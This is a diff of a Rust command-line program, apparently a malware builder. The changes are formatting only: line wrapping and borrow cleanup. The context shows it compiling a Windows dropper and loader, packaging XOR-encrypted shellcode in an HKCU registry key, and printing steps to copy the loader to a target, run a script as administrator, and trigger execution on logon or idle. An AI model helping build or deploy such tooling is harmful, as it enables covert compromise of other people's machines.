@@ -374,7 +374,7 @@ fn main() {
             // Compilar el dropper
             println!("\n🔨 Compilando dropper...");
             let compile_result = std::process::Command::new("cargo")
-                .args(&[
+                .args([
                     "build",
                     "--release",
                     "--target",
@@ -543,13 +543,14 @@ fn main() {
 
             // Get workspace root and loader template
             let workspace_root = get_workspace_root();
-            let loader_template = workspace_root.join("target/x86_64-pc-windows-gnu/release/loader.exe");
+            let loader_template =
+                workspace_root.join("target/x86_64-pc-windows-gnu/release/loader.exe");
 
             // Check if loader is compiled
             if !loader_template.exists() {
                 println!("\n🔨 Compilando loader...");
                 let compile_result = std::process::Command::new("cargo")
-                    .args(&[
+                    .args([
                         "build",
                         "--release",
                         "--target",
@@ -594,10 +595,16 @@ fn main() {
                     println!("   Registry Key: HKCU\\Software\\{}", package.reg_key_name);
                     println!("   Registry Value: {}", package.reg_value_name);
                     println!("   XOR Key: {} bytes", package.xor_key.len());
-                    println!("   Shellcode: {} bytes (encrypted)", package.encrypted_shellcode.len());
+                    println!(
+                        "   Shellcode: {} bytes (encrypted)",
+                        package.encrypted_shellcode.len()
+                    );
                     println!("\n📋 Próximos pasos:");
                     println!("   1. Copiar {} al target", package.loader_path.display());
-                    println!("   2. Ejecutar {} como administrador", package.script_path.display());
+                    println!(
+                        "   2. Ejecutar {} como administrador",
+                        package.script_path.display()
+                    );
                     println!("   3. El loader se ejecutará según el trigger configurado");
                 }
                 Err(e) => {
@@ -662,7 +669,7 @@ fn main() {
 /// Parse trigger string into TaskTrigger enum
 fn parse_trigger(trigger: &str) -> TaskTrigger {
     let trigger_lower = trigger.to_lowercase();
-    
+
     if trigger_lower == "logon" {
         TaskTrigger::OnLogon
     } else if trigger_lower == "idle" {
